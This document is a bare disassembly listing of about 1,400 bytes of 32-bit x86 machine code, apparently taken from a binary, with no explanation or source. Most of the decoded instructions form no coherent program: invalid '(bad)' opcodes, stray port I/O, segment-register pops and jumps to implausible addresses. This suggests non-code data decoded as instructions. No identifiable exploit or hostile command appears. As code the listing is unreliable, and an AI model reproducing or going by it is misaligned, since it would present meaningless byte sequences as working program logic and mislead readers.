13158c00:	da 25 be 55 ac 17    	fisubl 0x17ac55be
13158c06:	33 db                	xor    %ebx,%ebx
13158c08:	59                   	pop    %ecx
13158c09:	e5 1f                	in     $0x1f,%eax
13158c0b:	21 cb                	and    %ecx,%ebx
13158c0d:	20 4d 74             	and    %cl,0x74(%ebp)
13158c10:	38 74 02 7b          	cmp    %dh,0x7b(%edx,%eax,1)
13158c14:	03 2f                	add    (%edi),%ebp
13158c16:	31 8b f9 c9 74 32    	xor    %ecx,0x3274c9f9(%ebx)
13158c1c:	97                   	xchg   %eax,%edi
13158c1d:	18 50 89             	sbb    %dl,-0x77(%eax)
13158c20:	c8 27 9d ed          	enter  $0x9d27,$0xed
13158c24:	db 66 3c             	(bad) 0x3c(%esi)
13158c27:	59                   	pop    %ecx
13158c28:	09 32                	or     %esi,(%edx)
13158c2a:	19 89 01 c3 29 e9    	sbb    %ecx,-0x16d63cff(%ecx)
13158c30:	c8 76 7b af          	enter  $0x7b76,$0xaf
13158c34:	8f                   	(bad)
13158c35:	18 40 17             	sbb    %al,0x17(%eax)
13158c38:	75 eb                	jne    0x13158c25
13158c3a:	15 01 cc 37 5b       	adc    $0x5b37cc01,%eax
13158c3f:	ba 31 10 d0 79       	mov    $0x79d01031,%edx
13158c44:	31 e7                	xor    %esp,%edi
13158c46:	47                   	inc    %edi
13158c47:	c7                   	(bad)
13158c48:	2e e5 8f             	cs in  $0x8f,%eax
13158c4b:	9f                   	lahf
13158c4c:	04 c0                	add    $0xc0,%al
13158c4e:	ae                   	scas   %es:(%edi),%al
13158c4f:	25 28 a7 30 6b       	and    $0x6b30a728,%eax
13158c54:	b5 87                	mov    $0x87,%ch
13158c56:	5a                   	pop    %edx
13158c57:	e3 f9                	jecxz  0x13158c52
13158c59:	08 cb                	or     %cl,%bl
13158c5b:	7d b7                	jge    0x13158c14
13158c5d:	7d ed                	jge    0x13158c4c
13158c5f:	29 32                	sub    %esi,(%edx)
13158c61:	0c 84                	or     $0x84,%al
13158c63:	aa                   	stos   %al,%es:(%edi)
13158c64:	0d 25 38 dc 8b       	or     $0x8bdc3825,%eax
13158c69:	98                   	cwtl
13158c6a:	04 cf                	add    $0xcf,%al
13158c6c:	7d c3                	jge    0x13158c31
13158c6e:	3f                   	aas
13158c6f:	b6 0f                	mov    $0xf,%dh
13158c71:	80 fb 18             	cmp    $0x18,%bl
13158c74:	77 74                	ja     0x13158cea
13158c76:	8a c3                	mov    %bl,%al
13158c78:	8a 98 40 41 09 39    	mov    0x39094140(%eax),%bl
13158c7e:	1e                   	push   %ds
13158c7f:	e1 6b                	loope  0x13158cec
13158c81:	2d aa 54 ab 83       	sub    $0x83ab54aa,%eax
13158c86:	e0 7f                	loopne 0x13158d07
13158c88:	14 17                	adc    $0x17,%al
13158c8a:	9e                   	sahf
13158c8b:	63 ff                	arpl   %edi,%edi
13158c8d:	7a 60                	jp     0x13158cef
13158c8f:	c3                   	ret
13158c90:	50                   	push   %eax
13158c91:	52                   	push   %edx
13158c92:	51                   	push   %ecx
13158c93:	3a 83 b8 00 cf 58    	cmp    0x58cf00b8(%ebx),%al
13158c99:	75 d6                	jne    0x13158c71
13158c9b:	22 c4                	and    %ah,%al
13158c9d:	6e                   	outsb  %ds:(%esi),(%dx)
13158c9e:	7b 31                	jnp    0x13158cd1
13158ca0:	c0 97 13 74 5a ed 0b 	rclb   $0xb,-0x12a58bed(%edi)
13158ca7:	2d 32 89 3d e2       	sub    $0xe23d8932,%eax
13158cac:	89 c6                	mov    %eax,%esi
13158cae:	89 d7                	mov    %edx,%edi
13158cb0:	c5 c2 ff             	(bad)
13158cb3:	1d fc 39 f7 77       	sbb    $0x77f739fc,%eax
13158cb8:	13 74 2f 4c          	adc    0x4c(%edi,%ebp,1),%esi
13158cbc:	78 2a                	js     0x13158ce8
13158cbe:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
13158cc0:	89 c1                	mov    %eax,%ecx
13158cc2:	83 e1 03             	and    $0x3,%ecx
13158cc5:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
13158cc7:	48                   	dec    %eax
13158cc8:	0a f6                	or     %dh,%dh
13158cca:	fb                   	sti
13158ccb:	b7 31                	mov    $0x31,%bh
13158ccd:	74 31                	je     0x13158d00
13158ccf:	fc                   	cld
13158cd0:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
13158cd4:	18 11                	sbb    %dl,(%ecx)
13158cd6:	fd                   	std
13158cd7:	19 2d 76 dd 56 ee    	sbb    %ebp,0xee56dd76
13158cdd:	02 c7                	add    %bh,%al
13158cdf:	1f                   	pop    %ds
13158ce0:	fc                   	cld
13158ce1:	20 88 10 8f 1c 0d    	and    %cl,0xd1c8f10(%eax)
13158ce7:	0f 5d 03             	minps  (%ebx),%xmm0
13158cea:	54                   	push   %esp
13158ceb:	84 04 4f             	test   %al,(%edi,%ecx,2)
13158cee:	0b bd d8 53 7c 2d    	or     0x2d7c53d8(%ebp),%edi
13158cf4:	e4 f7                	in     $0xf7,%al
13158cf6:	5a                   	pop    %edx
13158cf7:	48                   	dec    %eax
13158cf8:	0c 0c                	or     $0xc,%al
13158cfa:	7e 13                	jle    0x13158d0f
13158cfc:	63 6f 7b             	arpl   %ebp,0x7b(%edi)
13158cff:	f3 66 96             	repz xchg %ax,%si
13158d02:	66 3d b0 d7          	cmp    $0xd7b0,%ax
13158d06:	72 06                	jb     0x13158d0e
13158d08:	f0 8b d0             	lock mov %eax,%edx
13158d0b:	df 05 b3 d7 76 07    	filds  0x776d7b3
13158d11:	bb 66 ba 12 74       	mov    $0x7412ba66,%ebx
13158d16:	07                   	pop    %es
13158d17:	6f                   	outsl  %ds:(%esi),(%dx)
13158d18:	bc 11 8f f0 19       	mov    $0x19f08f11,%esp
13158d1d:	cc                   	int3
13158d1e:	66 c7 80 7b 48 73 0d 	movw   $0x7b83,0xd73487b(%eax)
13158d25:	83 7b 
13158d27:	08 3f                	or     %bh,(%edi)
13158d29:	f0 b7 18             	lock mov $0x18,%bh
13158d2c:	05 07 c7 43 18       	add    $0x1843c707,%eax
13158d31:	68 27 9a ff 53       	push   $0x53ff9a27
13158d36:	18 aa bb 8f d4 b3    	sbb    %ch,-0x4c2b7045(%edx)
13158d3c:	28 15 d8 86 66 ba    	sub    %dl,0xba6686d8
13158d42:	b2 d7                	mov    $0xd7,%dl
13158d44:	0d 16 54 df 46       	or     $0x46df5416,%eax
13158d49:	0f 5e 93 31 35 10 04 	divps  0x4103531(%ebx),%xmm2
13158d50:	0c 88                	or     $0x88,%al
13158d52:	9d                   	popf
13158d53:	8b ed                	mov    %ebp,%ebp
13158d55:	6a 00                	push   $0x0
13158d57:	8d 09                	lea    (%ecx),%ecx
13158d59:	50                   	push   %eax
13158d5a:	ad                   	lods   %ds:(%esi),%eax
13158d5b:	03 14 50             	add    (%eax,%edx,2),%edx
13158d5e:	16                   	push   %ss
13158d5f:	5f                   	pop    %edi
13158d60:	47                   	inc    %edi
13158d61:	c7                   	(bad)
13158d62:	ec                   	in     (%dx),%al
13158d63:	00 44 97 0e          	add    %al,0xe(%edi,%edx,4)
13158d67:	08 94 36 7a e8 b5 f6 	or     %dl,-0x94a1786(%esi,%esi,1)
13158d6e:	6d                   	insl   (%dx),%es:(%edi)
13158d6f:	75 06                	jne    0x13158d77
13158d71:	28 40 03             	sub    %al,0x3(%eax)
13158d74:	23 c0                	and    %eax,%eax
13158d76:	11 7a 43             	adc    %edi,0x43(%edx)
13158d79:	1c 5b                	sbb    $0x5b,%al
13158d7b:	b1 73                	mov    $0x73,%cl
13158d7d:	0c 85                	or     $0x85,%al
13158d7f:	f6 41 66 c0          	testb  $0xc0,0x66(%ecx)
13158d83:	36 b9 26 42 80 50    	ss mov $0x50804226,%ecx
13158d89:	56                   	push   %esi
13158d8a:	40                   	inc    %eax
13158d8b:	6c                   	insb   (%dx),%es:(%edi)
13158d8c:	aa                   	stos   %al,%es:(%edi)
13158d8d:	00 1d 91 07 28 c0    	add    %bl,0xc0280791
13158d93:	4d                   	dec    %ebp
13158d94:	fd                   	std
13158d95:	1b 3b                	sbb    (%ebx),%edi
13158d97:	54                   	push   %esp
13158d98:	48                   	dec    %eax
13158d99:	64 7b 53             	fs jnp 0x13158def
13158d9c:	17                   	pop    %ss
13158d9d:	14 48                	adc    $0x48,%al
13158d9f:	0f 94 6b ad          	sete   -0x53(%ebx)
13158da3:	74 cd                	je     0x13158d72
13158da5:	51                   	push   %ecx
13158da6:	4b                   	dec    %ebx
13158da7:	ec                   	in     (%dx),%al
13158da8:	c7                   	(bad)
13158da9:	d7                   	xlat   %ds:(%ebx)
13158daa:	38 37                	cmp    %dh,(%edi)
13158dac:	16                   	push   %ss
13158dad:	9e                   	sahf
13158dae:	0d b9 17 34 84       	or     $0x843417b9,%eax
13158db3:	71 90                	jno    0x13158d45
13158db5:	56                   	push   %esi
13158db6:	7a 31                	jp     0x13158de9
13158db8:	ea 85 b8 dd a6 46 0c 	ljmp   $0xc46,$0xa6ddb885
13158dbf:	02 10                	add    (%eax),%dl
13158dc1:	66 6e                	data16 outsb %ds:(%esi),(%dx)
13158dc3:	2d b1 d7 74 c3       	sub    $0xc374d7b1,%eax
13158dc8:	56                   	push   %esi
13158dc9:	de 7c 74 0b          	fidivrs 0xb(%esp,%esi,2)
13158dcd:	48                   	dec    %eax
13158dce:	02 2e                	add    (%esi),%ch
13158dd0:	b0 18                	mov    $0x18,%al
13158dd2:	ec                   	in     (%dx),%al
13158dd3:	b8 fc 83 4d f1       	mov    $0xf14d83fc,%eax
13158dd8:	d2 ba 1f b9 03 e7    	sarb   %cl,-0x18fc46e1(%edx)
13158dde:	46                   	inc    %esi
13158ddf:	1c bc                	sbb    $0xbc,%al
13158de1:	26 62 9c 7c 5d fd 27 	bound  %ebx,%es:0x1727fd5d(%esp,%edi,2)
13158de8:	17 
13158de9:	40                   	inc    %eax
13158dea:	02 20                	add    (%eax),%ah
13158dec:	bc 99 09 f9 28       	mov    $0x28f90999,%esp
13158df1:	c0 fc 06             	sar    $0x6,%ah
13158df4:	24 48                	and    $0x48,%al
13158df6:	27                   	daa
13158df7:	95                   	xchg   %eax,%ebp
13158df8:	25 b8 fb 20 f8       	and    $0xf820fbb8,%eax
13158dfd:	0d 80 7e 48 02       	or     $0x2487e80,%eax
13158e02:	b2 b8                	mov    $0xb8,%dl
13158e04:	d5 ad                	aad    $0xad
13158e06:	bb d3 68 80 06       	mov    $0x68068d3,%ebx
13158e0b:	51                   	push   %ecx
13158e0c:	07                   	pop    %es
13158e0d:	52                   	push   %edx
13158e0e:	50                   	push   %eax
13158e0f:	29 48 50             	sub    %ecx,0x50(%eax)
13158e12:	17                   	pop    %ss
13158e13:	ba 6d 79 0c 1c       	mov    $0x1c0c796d,%edx
13158e18:	ff 1d 08 42 89 97    	lcall  *0x97894208
13158e1e:	81 7e ef f6 ee 85 04 	cmpl   $0x485eef6,-0x11(%esi)
13158e25:	99                   	cltd
13158e26:	0f 85 c3 24 66 ff    	jne    0x127bb2ef
13158e2c:	4e                   	dec    %esi
13158e2d:	04 27                	add    $0x27,%al
13158e2f:	ff 36                	push   (%esi)
13158e31:	23 b7 ed 76 db 2c    	and    0x2cdb76ed(%edi),%esi
13158e37:	40                   	inc    %eax
13158e38:	21 e6                	and    %esp,%esi
13158e3a:	13 2d 81 04 73 02    	adc    0x2730481,%ebp
13158e40:	bb 6a 4a b9 63       	mov    $0x63b94a6a,%ebx
13158e45:	cd 59                	int    $0x59
13158e47:	50                   	push   %eax
13158e48:	1b 5c ca 5b          	sbb    0x5b(%edx,%ecx,8),%ebx
13158e4c:	89 e2                	mov    %esp,%edx
13158e4e:	57                   	push   %edi
13158e4f:	ed                   	in     (%dx),%eax
13158e50:	b3 07                	mov    $0x7,%bl
13158e52:	8e 60 8d             	mov    -0x73(%eax),%fs
13158e55:	96                   	xchg   %eax,%esi
13158e56:	b7 52                	mov    $0x52,%bh
13158e58:	20 44 5a 48          	and    %al,0x48(%edx,%ebx,2)
13158e5c:	51                   	push   %ecx
13158e5d:	fe                   	(bad)
13158e5e:	df bf 99 a8 36 39    	fistpll 0x3936a899(%edi)
13158e64:	d0 73 6b             	shlb   $1,0x6b(%ebx)
13158e67:	80 bc 06 1c 0e 74 03 	cmpb   $0x40,0x3740e1c(%esi,%eax,1)
13158e6e:	40 
13158e6f:	eb ef                	jmp    0x13158e60
13158e71:	6a 02                	push   $0x2
13158e73:	9f                   	lahf
13158e74:	bd 80 dc 49 29       	mov    $0x2949dc80,%ebp
13158e79:	d0 3d 0d 54 48 75    	sarb   $1,0x7548540d
13158e7f:	9e                   	sahf
13158e80:	7b db                	jnp    0x13158e5d
13158e82:	fb                   	sti
13158e83:	76 eb                	jbe    0x13158e70
13158e85:	3d 8d 86 2c c8       	cmp    $0xc82c868d,%eax
13158e8a:	08 18                	or     %bl,(%eax)
13158e8c:	d6                   	salc
13158e8d:	cf                   	iret
13158e8e:	df a8 f0 16 35 14    	fildll 0x143516f0(%eax)
13158e94:	a8 fa                	test   $0xfa,%al
13158e96:	74 6a                	je     0x13158f02
13158e98:	f6 eb                	imul   %bl
13158e9a:	0e                   	push   %cs
13158e9b:	15 6a 06 2e d0       	adc    $0xd02e066a,%eax
13158ea0:	d3 c1                	rol    %cl,%ecx
13158ea2:	0b 1c b6             	or     (%esi,%esi,4),%ebx
13158ea5:	b3 cd                	mov    $0xcd,%bl
13158ea7:	b7 4d                	mov    $0x4d,%bh
13158ea9:	f5                   	cmc
13158eaa:	d2 34 74             	shlb   %cl,(%esp,%esi,2)
13158ead:	39 ce                	cmp    %ecx,%esi
13158eaf:	b1 25                	mov    $0x25,%cl
13158eb1:	17                   	pop    %ss
13158eb2:	e0 d8                	loopne 0x13158e8c
13158eb4:	3a ce                	cmp    %dh,%cl
13158eb6:	50                   	push   %eax
13158eb7:	24 a4                	and    $0xa4,%al
13158eb9:	10 19                	adc    %bl,(%ecx)
13158ebb:	02 54 38 6b          	add    0x6b(%eax,%edi,1),%dl
13158ebf:	34 b3                	xor    $0xb3,%al
13158ec1:	17                   	pop    %ss
13158ec2:	fc                   	cld
13158ec3:	8f c5                	pop    %ebp
13158ec5:	1a 14 61             	sbb    (%ecx,%eiz,2),%dl
13158ec8:	f6 b0 59 ad 46 b8    	divb   -0x47b952a7(%eax)
13158ece:	69 53 ea 0c e7 b6 70 	imul   $0x70b6e70c,-0x16(%ebx),%edx
13158ed5:	4c                   	dec    %esp
13158ed6:	3a dd                	cmp    %ch,%bl
13158ed8:	af                   	scas   %es:(%edi),%eax
13158ed9:	6e                   	outsb  %ds:(%esi),(%dx)
13158eda:	5f                   	pop    %edi
13158edb:	ba c2 c6 7b f7       	mov    $0xf77bc6c2,%edx
13158ee0:	8a 16                	mov    (%esi),%dl
13158ee2:	1a 24 8d 83 0a 67 14 	sbb    0x14670a83(,%ecx,4),%ah
13158ee9:	e5 da                	in     $0xda,%eax
13158eeb:	d6                   	salc
13158eec:	71 61                	jno    0x13158f4f
13158eee:	d3 a0 28 eb 66 10    	shll   %cl,0x1066eb28(%eax)
13158ef4:	06                   	push   %es
13158ef5:	0f ec af 60 cc a9 b6 	paddsb -0x495633a0(%edi),%mm5
13158efc:	f1                   	int1
13158efd:	27                   	daa
13158efe:	44                   	inc    %esp
13158eff:	50                   	push   %eax
13158f00:	07                   	pop    %es
13158f01:	f1                   	int1
13158f02:	b3 59                	mov    $0x59,%bl
13158f04:	7f 28                	jg     0x13158f2e
13158f06:	90                   	nop
13158f07:	8d 53 48             	lea    0x48(%ebx),%edx
13158f0a:	59                   	pop    %ecx
13158f0b:	dd 17                	fstl   (%edi)
13158f0d:	c6 44 03 48 b6       	movb   $0xb6,0x48(%ebx,%eax,1)
13158f12:	1b c1                	sbb    %ecx,%eax
13158f14:	ca 7b 07             	lret   $0x77b
13158f17:	09 48 04             	or     %ecx,0x4(%eax)
13158f1a:	b1 e9                	mov    $0xe9,%cl
13158f1c:	6e                   	outsb  %ds:(%esi),(%dx)
13158f1d:	6f                   	outsl  %ds:(%esi),(%dx)
13158f1e:	d0 ef                	shr    $1,%bh
13158f20:	b0 0f                	mov    $0xf,%al
13158f22:	49                   	dec    %ecx
13158f23:	66 83 e9 02          	sub    $0x2,%cx
13158f27:	93                   	xchg   %eax,%ebx
13158f28:	da ff                	(bad)
13158f2a:	d3 7a eb             	sarl   %cl,-0x15(%edx)
13158f2d:	1b 36                	sbb    (%esi),%esi
13158f2f:	ca 06 b7             	lret   $0xb706
13158f32:	94                   	xchg   %eax,%esp
13158f33:	eb 17                	jmp    0x13158f4c
13158f35:	7f d2                	jg     0x13158f09
13158f37:	fd                   	std
13158f38:	3d 92 d9 c8 cd       	cmp    $0xcdc8d992,%eax
13158f3d:	eb 11                	jmp    0x13158f50
13158f3f:	5d                   	pop    %ebp
13158f40:	67 11 3d             	adc    %edi,(%di)
13158f43:	1d 09 12 b3 50       	sbb    $0x50b31209,%eax
13158f48:	20 49 78             	and    %cl,0x78(%ecx)
13158f4b:	cf                   	iret
13158f4c:	72 f2                	jb     0x13158f40
13158f4e:	20 77 d8             	and    %dh,-0x28(%edi)
13158f51:	33 f6                	xor    %esi,%esi
13158f53:	b1 2f                	mov    $0x2f,%cl
13158f55:	77 a9                	ja     0x13158f00
13158f57:	d0 5a e1             	rcrb   $1,-0x1f(%edx)
13158f5a:	29 66 25             	sub    %esp,0x25(%esi)
13158f5d:	3a 09                	cmp    (%ecx),%cl
13158f5f:	03 08                	add    (%eax),%ecx
13158f61:	56                   	push   %esi
13158f62:	67 cc                	addr16 int3
13158f64:	d1 e2                	shl    $1,%edx
13158f66:	1c a3                	sbb    $0xa3,%al
13158f68:	f2 0a 24 36          	repnz or (%esi,%esi,1),%ah
13158f6c:	2a e5                	sub    %ch,%ah
13158f6e:	de 74 1b 9d          	fidivs -0x63(%ebx,%ebx,1)
13158f72:	4f                   	dec    %edi
13158f73:	4c                   	dec    %esp
13158f74:	ba 38 e3 ec 6d       	mov    $0x6dece338,%edx
13158f79:	b9 94 a0 b8 69       	mov    $0x69b8a094,%ecx
13158f7e:	63 c6                	arpl   %eax,%esi
13158f80:	ef                   	out    %eax,(%dx)
13158f81:	d6                   	salc
13158f82:	b8 bc 15 3a c7       	mov    $0xc73a15bc,%eax
13158f87:	88 cd                	mov    %cl,%ch
13158f89:	c1 e0 be             	shl    $0xbe,%eax
13158f8c:	05 77 7c fe eb       	add    $0xebfe7c77,%eax
13158f91:	89 d1                	mov    %edx,%ecx
13158f93:	3c 09                	cmp    $0x9,%al
13158f95:	f3 ab                	rep stos %eax,%es:(%edi)
13158f97:	89 d1                	mov    %edx,%ecx
13158f99:	aa                   	stos   %al,%es:(%edi)
13158f9a:	5f                   	pop    %edi
13158f9b:	ff 31                	push   (%ecx)
13158f9d:	db 69 70             	fldt   0x70(%ecx)
13158fa0:	ec                   	in     (%dx),%al
13158fa1:	8d a7 93 fe 05 58    	lea    0x5805fe93(%edi),%esp
13158fa7:	08 42 89             	or     %al,-0x77(%edx)
13158faa:	0a f7                	or     %bh,%dh
13158fac:	e2 34                	loop   0x13158fe2
13158fae:	7c 45                	jl     0x13158ff5
13158fb0:	2a 18                	sub    (%eax),%bl
13158fb2:	2b 78 50             	sub    0x50(%eax),%edi
13158fb5:	8b 6c df fa          	mov    -0x6(%edi,%ebx,8),%ebp
13158fb9:	76 2b                	jbe    0x13158fe6
13158fbb:	7f 26                	jg     0x13158fe3
13158fbd:	bf cc 00 0c 8a       	mov    $0x8a0c00cc,%edi
13158fc2:	1e                   	push   %ds
13158fc3:	46                   	inc    %esi
13158fc4:	e8 20 74 f8 b5       	call   0xc90e03e9
13158fc9:	7e 96                	jle    0x13158f61
13158fcb:	b7 b7                	mov    $0xb7,%bh
13158fcd:	00 06                	add    %al,(%esi)
13158fcf:	2d 74 62 04 2b       	sub    $0x2b046274,%eax
13158fd4:	74 5f                	je     0x13159035
13158fd6:	24 78                	and    $0x78,%al
13158fd8:	74 5a                	je     0x13159034
13158fda:	ee                   	out    %al,(%dx)
13158fdb:	35 58 5e 58 74       	xor    $0x74585e58,%eax
13158fe0:	55                   	push   %ebp
13158fe1:	30 86 27 11 ef 1a    	xor    %al,0x1aef1127(%esi)
13158fe7:	6d                   	insl   (%dx),%es:(%edi)
13158fe8:	9f                   	lahf
13158fe9:	48                   	dec    %eax
13158fea:	43                   	inc    %ebx
13158feb:	84 f9                	test   %bh,%cl
13158fed:	20 79 05             	and    %bh,0x5(%ecx)
13158ff0:	2d 80 eb 30 70       	sub    $0x7030eb80,%eax
13158ff5:	df fa                	(bad)
13158ff7:	6f                   	outsl  %ds:(%esi),(%dx)
13158ff8:	11 09                	adc    %ecx,(%ecx)
13158ffa:	77 25                	ja     0x13159021
13158ffc:	39 f8                	cmp    %edi,%eax
13158ffe:	77 21                	ja     0x13159021
13159000:	8d 3d 01 c0 01 d8    	lea    0xd801c001,%edi
13159006:	29 ff                	sub    %edi,%edi
13159008:	5b                   	pop    %ebx
13159009:	83 1b 4b             	sbbl   $0x4b,(%ebx)
1315900c:	e6 fe                	out    %al,$0xfe
1315900e:	cd fe                	int    $0xfe
13159010:	69 7d 54 eb 09 46 eb 	imul   $0xeb4609eb,0x54(%ebp),%edi
13159017:	06                   	push   %es
13159018:	f7 d8                	neg    %eax
1315901a:	96                   	xchg   %eax,%esi
1315901b:	e0 ee                	loopne 0x1315900b
1315901d:	ff                   	(bad)
1315901e:	7e 4b                	jle    0x1315906b
13159020:	78 49                	js     0x1315906b
13159022:	5b                   	pop    %ebx
13159023:	29 de                	sub    %ebx,%esi
13159025:	eb 47                	jmp    0x1315906e
13159027:	fe c5                	inc    %ch
13159029:	20 eb                	and    %ch,%bl
1315902b:	9c                   	pushf
1315902c:	bf ff 0f 6d 8d       	mov    $0x8d6d0fff,%edi
13159031:	6a c7                	push   $0xffffffc7
13159033:	2a 74 df 41          	sub    0x41(%edi,%ebx,8),%dh
13159037:	f0 49                	lock dec %ecx
13159039:	20 75 7f             	and    %dh,0x7f(%ebp)
1315903c:	d9 9e 4c 76 0b 07    	fstps  0x70b764c(%esi)
13159042:	11 05 77 d0 80 c3    	adc    %eax,0xc380d077
13159048:	0a 57 c9             	or     -0x37(%edi),%dl
1315904b:	7e bb                	jle    0x13159008
1315904d:	1c b6                	sbb    $0xb6,%al
1315904f:	ea 04 55 d5 75 02 4c 	ljmp   $0x4c02,$0x75d55504
13159056:	59                   	pop    %ecx
13159057:	31 f6                	xor    %esi,%esi
13159059:	89 32                	mov    %esi,(%edx)
1315905b:	43                   	inc    %ebx
1315905c:	c1 34 01 c3          	shll   $0xc3,(%ecx,%eax,1)
13159060:	ef                   	out    %eax,(%dx)
13159061:	2b a0 80 31 c2 ab    	sub    -0x543dce80(%eax),%esp
13159067:	31 a1 12 13 2e b3    	xor    %esp,-0x4cd1ecee(%ecx)
1315906d:	71 84                	jno    0x13158ff3
1315906f:	9f                   	lahf
13159070:	16                   	push   %ss
13159071:	ac                   	lods   %ds:(%esi),%al
13159072:	b3 7b                	mov    $0x7b,%bl
13159074:	20 30                	and    %dh,(%eax)
13159076:	c9                   	leave
13159077:	82 6b 2c 45          	subb   $0x45,0x2c(%ebx)
1315907b:	54                   	push   %esp
1315907c:	69 c3 81 67 a3 e1    	imul   $0xe1a36781,%ebx,%eax
13159082:	17                   	pop    %ss
13159083:	16                   	push   %ss
13159084:	d6                   	salc
13159085:	d6                   	salc
13159086:	78 0f                	js     0x13159097
13159088:	cb                   	lret
13159089:	f4                   	hlt
1315908a:	37                   	aaa
1315908b:	e0 3a                	loopne 0x131590c7
1315908d:	1b 37                	sbb    (%edi),%esi
1315908f:	c6                   	(bad)
13159090:	74 35                	je     0x131590c7
13159092:	8b 78 14             	mov    0x14(%eax),%edi
13159095:	03 78 28             	add    0x28(%eax),%edi
13159098:	7c fb                	jl     0x13159095
1315909a:	7f 84                	jg     0x13159020
1315909c:	2b 50 0c             	sub    0xc(%eax),%edx
1315909f:	39 ca                	cmp    %ecx,%edx
131590a1:	7f 20                	jg     0x131590c3
131590a3:	01 06                	add    %eax,(%esi)
131590a5:	29 d1                	sub    %edx,%ecx
131590a7:	50                   	push   %eax
131590a8:	51                   	push   %ecx
131590a9:	6f                   	outsl  %ds:(%esi),(%dx)
131590aa:	16                   	push   %ss
131590ab:	fb                   	sti
131590ac:	ae                   	scas   %es:(%edi),%al
131590ad:	17                   	pop    %ss
131590ae:	89 ff                	mov    %edi,%edi
131590b0:	50                   	push   %eax
131590b1:	1c 94                	sbb    $0x94,%al
131590b3:	04 59                	add    $0x59,%al
131590b5:	58                   	pop    %eax
131590b6:	eb da                	jmp    0x13159092
131590b8:	4b                   	dec    %ebx
131590b9:	08 b6 11 b8 81 9a    	or     %dh,-0x657e47ef(%esi)
131590bf:	01 48 0c             	add    %ecx,0xc(%eax)
131590c2:	c3                   	ret
131590c3:	90                   	nop
131590c4:	21 ba 6d e3 5d 94    	and    %edi,-0x6ba21c93(%edx)
131590ca:	bb bc f9 40 7e       	mov    $0x7e40f9bc,%ebx
131590cf:	64 51                	fs push %ecx
131590d1:	40                   	inc    %eax
131590d2:	32 d8                	xor    %al,%bl
131590d4:	c0 e0 d9             	shl    $0xd9,%al
131590d7:	b9 40 74 1b 78       	mov    $0x781b7440,%ecx
131590dc:	2b 3f                	sub    (%edi),%edi
131590de:	12 a1 b2 db d5 03    	adc    0x3d5dbb2(%ecx),%ah
131590e4:	c3                   	ret
131590e5:	20 00                	and    %al,(%eax)
131590e7:	35 60 86 61 ab       	xor    $0xab618660,%eax
131590ec:	e7 34                	out    %eax,$0x34
131590ee:	54                   	push   %esp
131590ef:	7b 6c                	jnp    0x1315915d
131590f1:	41                   	inc    %ecx
131590f2:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
131590f5:	f6 fd                	idiv   %ch
131590f7:	01 50 54             	add    %edx,0x54(%eax)
131590fa:	0d 97 a1 16 6a       	or     $0x6a16a197,%eax
131590ff:	eb c4                	jmp    0x131590c5
13159101:	0a 64 b8 9c          	or     -0x64(%eax,%edi,4),%ah
13159105:	b9 1b b3 82 6d       	mov    $0x6d82b31b,%ecx
1315910a:	eb 14                	jmp    0x13159120
1315910c:	1a 15 01 c0 c2 0c    	sbb    0xcc2c001,%dl
13159112:	96                   	xchg   %eax,%esi
13159113:	0a 26                	or     (%esi),%ah
13159115:	c6                   	(bad)
13159116:	11 a9 b6 ea 5c 7b    	adc    %ebp,0x7b5ceab6(%ecx)
1315911c:	f0 1f                	lock pop %ds
1315911e:	f6 4b bf a2          	testb  $0xa2,-0x41(%ebx)
13159122:	f3 45                	repz inc %ebp
13159124:	1c 90                	sbb    $0x90,%al
13159126:	c3                   	ret
13159127:	07                   	pop    %es
13159128:	75 1c                	jne    0x13159146
1315912a:	6a 01                	push   $0x1
1315912c:	0b 40 8b             	or     -0x75(%eax),%eax
1315912f:	ad                   	lods   %ds:(%esi),%eax
13159130:	35 25 2d 37 3d       	xor    $0x3d372d25,%eax
13159135:	e9 0b 16 1e d0       	jmp    0xe333a745
1315913a:	3f                   	aas
1315913b:	07                   	pop    %es
1315913c:	dd 9a b3 cb 47 ff    	fstpl  -0xb8344d(%edx)
13159142:	01 5c 37 d7          	add    %ebx,-0x29(%edi,%esi,1)
13159146:	f4                   	hlt
13159147:	0f b7 05 18 c0 e6 db 	movzwl 0xdbe6c018,%eax
1315914e:	40                   	inc    %eax
1315914f:	db e2                	fnclex
13159151:	f8                   	clc
13159152:	8d 1f                	lea    (%edi),%ebx
13159154:	50                   	push   %eax
13159155:	34 01                	xor    $0x1,%al
13159157:	64 2d 0f 34 3c 39    	fs sub $0x393c340f,%eax
1315915d:	62 68 1a             	bound  %ebp,0x1a(%eax)
13159160:	e1 c4                	loope  0x13159126
13159162:	3d 4d b5 3c b7       	cmp    $0xb73cb54d,%eax
13159167:	28 ab cb 3d 2d 30    	sub    %ch,0x302d3dcb(%ebx)
1315916d:	20 cb                	and    %cl,%bl
1315916f:	76 3b                	jbe    0x131591ac
13159171:	6c                   	insb   (%dx),%es:(%edi)
13159172:	54                   	push   %esp
13159173:	f4                   	hlt
13159174:	15 2f f4 50 33       	adc    $0x3350f42f,%eax
13159179:	f8                   	clc
1315917a:	00 2c 3e             	add    %ch,(%esi,%edi,1)
1315917d:	d7                   	xlat   %ds:(%ebx)
1315917e:	34 80                	xor    $0x80,%al
13159180:	8b 40 32             	mov    0x32(%eax),%eax
13159183:	cc                   	int3
13159184:	91                   	xchg   %eax,%ecx
13159185:	07                   	pop    %es
13159186:	8b 01                	mov    (%ecx),%eax
13159188:	9b                   	fwait
13159189:	44                   	inc    %esp
1315918a:	15 bc 87 ef 66       	adc    $0x66ef87bc,%eax
1315918f:	4b                   	dec    %ebx
13159190:	97                   	xchg   %eax,%edi
13159191:	2e bd a1 70 63 c0    	cs mov $0xc06370a1,%ebp
13159197:	ff 77 55             	push   0x55(%edi)
1315919a:	f8                   	clc
1315919b:	c8 e2 2f b4          	enter  $0x2fe2,$0xb4
1315919f:	f8                   	clc
131591a0:	fd                   	std
131591a1:	3f                   	aas
131591a2:	66 0b c2             	or     %dx,%ax
131591a5:	66 a3 14 8b e5 9d    	mov    %ax,0x9de58b14
131591ab:	17                   	pop    %ss
131591ac:	4f                   	dec    %edi
131591ad:	46                   	inc    %esi
131591ae:	54                   	push   %esp
131591af:	f8                   	clc
131591b0:	ff                   	(bad)
131591b1:	ff                   	(bad)
131591b2:	ff 57 41             	call   *0x41(%edi)
131591b5:	52                   	push   %edx
131591b6:	45                   	inc    %ebp
131591b7:	5c                   	pop    %esp
131591b8:	42                   	inc    %edx
131591b9:	6f                   	outsl  %ds:(%esi),(%dx)
